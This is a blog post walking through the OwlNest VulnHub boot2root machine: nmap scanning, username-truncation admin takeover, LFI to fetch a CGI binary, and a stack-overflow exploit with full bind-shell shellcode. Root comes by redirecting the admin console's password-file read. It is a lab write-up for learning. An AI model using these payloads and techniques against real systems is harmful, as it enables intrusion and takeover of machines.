---
author: recrudesce
comments: false
date: 2014-10-26 17:16:50+00:00
layout: post
slug: owl-up-in-my-grill
title: Owl Up In My Grill
wordpress_id: 246
categories:
- VM's
tags:
- boot2root
- hacking
- Infosec
- owlnest
- vm
- vulnhub
---

So, while we were all sitting in #vulnhub (on Freenode) waiting for[superkojiman](https://twitter.com/superkojiman) to release Persistence, [Swappage](https://twitter.com/swappage) released [OwlNest](vulnhub.com/entry/owlnest-102,102/). I thought, what the hell, might as well use it to pass the time, right ? I was, however, not expecting it to take me 4 days...
<!-- more -->


## Were You Born in a Barn (Owl) ?

A quick dig around using NMAP

``` bash
root@pwk:/var/www# nmap -sS -O -p1-65535 --script banner 172.16.56.131 -P0

Starting Nmap 6.47 ( http://nmap.org ) at 2014-09-01 22:49 BST
Nmap scan report for 172.16.56.131
Host is up (0.00034s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
|_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
80/tcp    open  http
111/tcp   open  rpcbind
31337/tcp open  Elite
| banner: (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)\x0D\x
|_0A        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\\...
34895/tcp open  unknown
MAC Address: 00:0C:29:9A:51:B8 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.10
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
root@pwk:/var/www#
```

Looks like there's a banner on port 31337, might as well get all of it, and see if the service behind it is vulnerable to format string.

``` bash
root@pwk:/var/www# nc -nv 172.16.56.131 31337
nc: 172.16.56.131 31337 open
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%Ss
Ready: help

Syntax: command <argument>

help		 This help
username	 Specify your login name
password	 Specify your password
privs	 Specify your access level
login		 login to shell with specified username and password

Ready:
```

This looks like something we'll need a username and password for. As none are known, this port is being ignored for now. Port 80's where it's at then.

[![owlnest_001](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_001.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_001.png)

The Register link allows us to create a new user, which we can use to log in and look around

[![owlnest_002](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_002.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_002.png)

But it seems we're not allowed to use the Upload feature, because we're not "admin". An interesting point to note here is that the URL for the Upload feature is http://172.16.56.131/uploadform.php?page=forms/form.php, which means we could possibly leverage it for LFI. No other links on the site work in this way.

Looking at the source for the registration page, it seems the username is capped at 16 characters.

``` html
<div class="form-group">
				<label for="nome" class="col-sm-2 col-lg-2 control-label">Login Name:</label>
				<div class="col-sm-5 col-lg-5">
					<input type="text" class="form-control" maxlength="16" name="username" id="username" placeholder="Choose a Login name...">
				</div>
			</div>
```

Could we cheat the system and register a user with the name "admin" and then add 11 spaces after it plus a random character ? We can assume that the registration form will truncate any characters over 16. Tamper data is our friend here - the form can be filled in with the username of "admin" and then intercepted with Tamper data (or Burp, if you want) to modify the username POST variable to "admin           a" and submitted.

[![owlnest_003](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_003.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_003.png)

[![owlnest_004](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_004.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_004.png)

[![owlnest_005](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_005.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_005.png)

Once this malicious user is created, it is possible to then log in with the username of "admin" and the password we set for "admin           a".

[![owlnest_006](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_006.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_006.png)

Which allows access to the Upload feature (not that we're going to use it for it's intended use)

[![owlnest_007](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_007.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_007.png)

* * *

## This is a Hoot !

The upload form posts to /application/upload

``` html
<form class="form-horizontal" method="POST" enctype="multipart/form-data" action="/application/upload">
```

Which when called with no arguments shows the following

[![owlnest_008](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_008.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_008.png)

It is possible to browse to the application folder, which shows that the application is actually 601kb - a bit much just to parse an upload form.

[![owlnest_009](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_009.png)](http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_009.png)

## Owls Well That Ends Well

The uploadform.php page can be used to provide us with a base64 encoded copy of the upload binary, which means it will not be parsed or executed.

[![owlnest_010](http://fourfourfourfour.co/wp-content/uploads/2014/10/owlnest_010.png)](http://fourfourfourfour.co/wp-content/uploads/2014/10/owlnest_010.png)

With the binary now available offline, we can go about working out what it does. It's a CGI binary, so we can interact with it via the command line using the QUERY_STRING environment value. Lets set something really simple first. I've purposefully not included any GDB stuff here, as an excuse for you to work it out and learn :)

``` bash
root@pwk:~# export QUERY_STRING="name=Me&surname=Me&Description=Me2&uploadfield=Blah&email=me@me.com"
root@pwk:~# ./owlbin
Content-type: text/plain

Unable to open file
root@pwk:~#
```

It is possible to overflow this application via the email variable, which through some further investigation identifies that EIP is at offset 277.

``` bash
root@pwk:~# export QUERY_STRING=$(python -c 'print "uploadfield=/etc/passwd&uploadfield=bleh99&name=Me&email=AAH@" + "A"*276+"BBBB"')
root@pwk:~# ./owlbin
Content-type: text/plain

Segmentation fault
root@pwk:~#
```

gdb-peda can be used to find a jmp esp call, which is at 0x80c75ab9. This is what we'll set our EIP value to, which should hopefully jump to our bind shell shellcode. This can be completely exploited as follows

``` bash
root@pwk:~# export QUERY_STRING=$(python -c 'print "uploadfield=/etc/passwd&uploadfield=passwd&name=Russ&email=AAH@" + "A"*276+"\xab\x75\x0c\x08" + "\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"')
root@pwk:~# curl -v "http://172.16.56.140/application/upload" --data "$QUERY_STRING"
* About to connect() to 172.16.56.140 port 80 (#0)
*   Trying 172.16.56.140...
* connected
* Connected to 172.16.56.140 (172.16.56.140) port 80 (#0)
> POST /application/upload HTTP/1.1
> User-Agent: curl/7.26.0
> Host: 172.16.56.140
> Accept: */*
> Content-Length: 436
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 436 out of 436 bytes
root@pwk:~# nc -nv 172.16.56.140 1337
nc: 172.16.56.140 1337 open
id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

Once a public key is added to authorized_hosts, we can SSH in and obtain a full TTY shell.

``` bash
$ ssh rmp@172.16.56.131
The authenticity of host '172.16.56.131 (172.16.56.131)' can't be established.
RSA key fingerprint is c0:f8:4e:c6:f9:28:14:5b:c3:ed:8a:00:51:aa:82:d5.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.56.131' (RSA) to the list of known hosts.
Linux owlnest 3.2.0-4-686-pae #1 SMP Debian 3.2.60-1+deb7u3 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
rmp@owlnest:~$ id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
rmp@owlnest:~$
```

There's one application available in /home/rmp, and that's the application that is listening on port 31337 (the one that requested username and password etc).

``` bash
rmp@owlnest:~$ ls -l
total 588
-rwx------ 1 rmp rmp 599275 Aug 11 13:35 adminconsole
rmp@owlnest:~$
```

which when straced, shows that it is reading /root/password.txt to check the provided credentials.

``` bash
root@pwk:~# strace ./adminconsole
execve("./adminconsole", ["./adminconsole"], [/* 19 vars */]) = 0
uname({sys="Linux", node="pwk", ...})   = 0
brk(0)                                  = 0x9407000
brk(0x9407cd0)                          = 0x9407cd0
set_thread_area({entry_number:-1 -> 6, base_addr:0x9407830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
brk(0x9428cd0)                          = 0x9428cd0
brk(0x9429000)                          = 0x9429000
fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775e000
write(1, "        (\\___/)   (\\___/)   (\\__"..., 67        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
) = 67
write(1, "        /0\\ /0\\   /o\\ /o\\   /0\\ "..., 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
) = 67
write(1, "        \\__V__/   \\__V__/   \\__V"..., 67        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
) = 67
write(1, "       /|:. .:|\\ /|;, ,;|\\ /|:. "..., 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
) = 68
write(1, "       \\\\:::::// \\\\;;;;;// \\\\:::"..., 68       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
) = 68
write(1, "   -----`\"\" \"\"`---`\"\" \"\"`---`\"\" "..., 70   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
) = 70
write(1, "        \\__V__/   \\__V__/   \\__V"..., 69        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

) = 69
write(1, "This is the OwlNest Administrati"..., 46This is the OwlNest Administration console

) = 46
write(1, "Type Help for a list of availabl"..., 47Type Help for a list of available commands.

) = 47
write(1, "Ready: ", 7Ready: )                  = 7
fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775d000
read(0, username root
"username root\n", 1024)        = 14
write(1, "Ready: ", 7Ready: )                  = 7
read(0, privs AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
"privs AAAAAAAAAAAAAAAAAAAAAAAAAA"..., 1024) = 96
write(1, "Ready: ", 7Ready: )                  = 7
read(0, password hello
"password hello\n", 1024)       = 15
open("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ", O_RDONLY) = -1 ENOENT (No such file or directory)
open("/root/password.txt", O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775c000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
_llseek(3, 0, [0], SEEK_SET)            = 0
read(3, "cunt\n", 5)                    = 5
_llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb775c000, 4096)                = 0
write(1, "Ready: ", 7Ready: )                  = 7
read(0, ^C <unfinished ...>
root@pwk:~# 
```

However, by pure chance, in this particular attempt, I tried to overflow the privs command, and as you can see, it seems the application is attempting to open AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA before the password file. Can we use this to make the application open a file containing a password we control ? Yes, yes we can...

``` bash
root@pwk:~# strace ./adminconsole
execve("./adminconsole", ["./adminconsole"], [/* 19 vars */]) = 0
uname({sys="Linux", node="pwk", ...})   = 0
brk(0)                                  = 0x84b0000
brk(0x84b0cd0)                          = 0x84b0cd0
set_thread_area({entry_number:-1 -> 6, base_addr:0x84b0830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
brk(0x84d1cd0)                          = 0x84d1cd0
brk(0x84d2000)                          = 0x84d2000
fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7717000
write(1, "        (\\___/)   (\\___/)   (\\__"..., 67        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
) = 67
write(1, "        /0\\ /0\\   /o\\ /o\\   /0\\ "..., 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
) = 67
write(1, "        \\__V__/   \\__V__/   \\__V"..., 67        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
) = 67
write(1, "       /|:. .:|\\ /|;, ,;|\\ /|:. "..., 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
) = 68
write(1, "       \\\\:::::// \\\\;;;;;// \\\\:::"..., 68       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
) = 68
write(1, "   -----`\"\" \"\"`---`\"\" \"\"`---`\"\" "..., 70   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
) = 70
write(1, "        \\__V__/   \\__V__/   \\__V"..., 69        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

) = 69
write(1, "This is the OwlNest Administrati"..., 46This is the OwlNest Administration console

) = 46
write(1, "Type Help for a list of availabl"..., 47Type Help for a list of available commands.

) = 47
write(1, "Ready: ", 7Ready: )                  = 7
fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7716000
read(0, username root
"username root\n", 1024)        = 14
write(1, "Ready: ", 7Ready: )                  = 7
read(0, privs /home/meh/password.txt
"privs /home/meh/password.txt\n", 1024) = 29
write(1, "Ready: ", 7Ready: )                  = 7
read(0, password arse
"password arse\n", 1024)        = 14
open("rd.txt", O_RDONLY)                = -1 ENOENT (No such file or directory)
open("/root/password.txt", O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
_llseek(3, 0, [0], SEEK_SET)            = 0
read(3, "blah\n", 5)                    = 5
_llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb7715000, 4096)                = 0
```

As you can see here, it's cut off the first 16 characters of our priv input, and is trying to open "rd.txt", which doesn't exist. Therefore we have to pad the privs input by 16 characters.

``` bash
write(1, "Ready: ", 7Ready: )                  = 7
read(0, username root
"username root\n", 1024)        = 14
write(1, "Ready: ", 7Ready: )                  = 7
read(0, privs AAAAAAAAAAAAAAAA/home/meh/password.txt
"privs AAAAAAAAAAAAAAAA/home/meh/"..., 1024) = 45
write(1, "Ready: ", 7Ready: )                  = 7
read(0, password bleh
"password bleh\n", 1024)        = 14
open("/home/meh/password.txt", O_RDONLY) = -1 ENOENT (No such file or directory)
open("/root/password.txt", O_RDONLY)    = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7715000
fstat64(3, {st_mode=S_IFREG|0644, st_size=5, ...}) = 0
_llseek(3, 0, [0], SEEK_SET)            = 0
read(3, "cunt\n", 5)                    = 5
_llseek(3, 5, [5], SEEK_SET)            = 0
close(3)                                = 0
munmap(0xb7715000, 4096)                = 0
write(1, "Ready: ", 7Ready: )                  = 7
read(0,
```

So, all we need to do now, is write a file to /home/rmp containing a password, and make the application read it instead of /root/password.txt.

``` bash
root@pwk:~# nc 172.16.56.140 31337
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: username root
Ready: privs AAAAAAAAAAAAAAAA/home/rmp/password.txt
Ready: password password
Ready: login
Access Granted!
Dropping into /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
               \ `-._......_.-` /
                `.  '.    .'  .'  	Oh Well, in the end you did it!
                 //  _`\/`_  \\    	You stopped the olws' evil plan
                ||  /\O||O/\  ||   	By pwning their secret base you
                |\  \_/||\_/  /|   	saved the world!
                \ '.   \/   .' /
                / ^ `'~  ~'`   \
               /  _-^_~ -^_ ~-  |
               | / ^_ -^_- ~_^\ |
               | |~_ ^- _-^_ -| |
               | \  ^-~_ ~-_^ / |
               \_/;-.,____,.-;\_/
        ==========(_(_(==)_)_)=========

The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4

Hope you enjoyed this vulnerable VM.
Looking forward to see a writeup from you soon!
don't forget to ping me on twitter with your thoughts

Sincerely
@Swappage

PS: why the owls? oh well, I really don't know and yes: i really suck at fictioning :p
True story is that i was looking for some ASCII art to place in the puzzles and owls popped out first
```


![](http://media.tumblr.com/69d8d838b215ce8aeb5bcee2cac8c67a/tumblr_inline_n6f627Eb3o1rv1fhg.gif)
